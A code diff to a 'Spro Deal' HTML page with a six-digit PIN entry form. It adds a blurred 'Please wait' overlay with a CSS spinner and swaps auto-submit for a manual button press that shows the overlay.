@@ -100,7 +100,6 @@
       border-color: var(--border-active);
       border-width: 2.5px;
     }
-    /* hidden input that collects the full PIN */
     #pin-hidden { display: none; }
     .error-msg {
       background: #ffe5e5;
@@ -129,9 +128,53 @@
       transition: opacity 0.2s;
     }
     .btn-submit:hover { opacity: 0.88; }
+
+    /* ── Please Wait Overlay ── */
+    .wait-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(255, 255, 255, 0.72);
+      backdrop-filter: blur(3px);
+      -webkit-backdrop-filter: blur(3px);
+      z-index: 999;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 18px;
+    }
+    .wait-overlay.active { display: flex; }
+
+    /* Spinner */
+    .spinner {
+      width: 52px;
+      height: 52px;
+      border: 5px solid #d6f5c4;
+      border-top-color: var(--green);
+      border-radius: 50%;
+      animation: spin 0.75s linear infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .wait-text {
+      font-family: 'Poppins', sans-serif;
+      font-size: 15px;
+      font-weight: 600;
+      color: #333;
+      letter-spacing: 0.3px;
+    }
   </style>
 </head>
 <body>
+
+  <!-- Please Wait Overlay -->
+  <div class="wait-overlay" id="waitOverlay">
+    <div class="spinner"></div>
+    <div class="wait-text">Please wait...</div>
+  </div>
+
   <div class="phone-frame">
     <div class="banner">
       <div class="brand-name">Spro Deal</div>
@@ -182,23 +225,18 @@
   </div>
 
   <script>
-    const boxes = document.querySelectorAll('.pin-box');
-    const form  = document.getElementById('pin-form');
+    const boxes  = document.querySelectorAll('.pin-box');
+    const form   = document.getElementById('pin-form');
     const hidden = document.getElementById('pin-hidden');
+    const overlay = document.getElementById('waitOverlay');
 
     boxes.forEach((box, i) => {
       box.addEventListener('input', () => {
-        // Only allow digits
         box.value = box.value.replace(/\D/g, '');
         if (box.value.length === 1 && i < boxes.length - 1) {
           boxes[i + 1].focus();
         }
-        // Auto-submit when all 6 filled
-        const pin = [...boxes].map(b => b.value).join('');
-        if (pin.length === 6) {
-          hidden.value = pin;
-          form.submit();
-        }
+        // NO auto-submit — user must press the button
       });
 
       box.addEventListener('keydown', (e) => {
@@ -214,10 +252,10 @@
       });
     });
 
-    // Collect PIN into hidden field before manual submit too
-    form.addEventListener('submit', () => {
+    form.addEventListener('submit', (e) => {
       const pin = [...boxes].map(b => b.value).join('');
       hidden.value = pin;
+      overlay.classList.add('active');   // show spinner on submit
     });
   </script>
 </body>
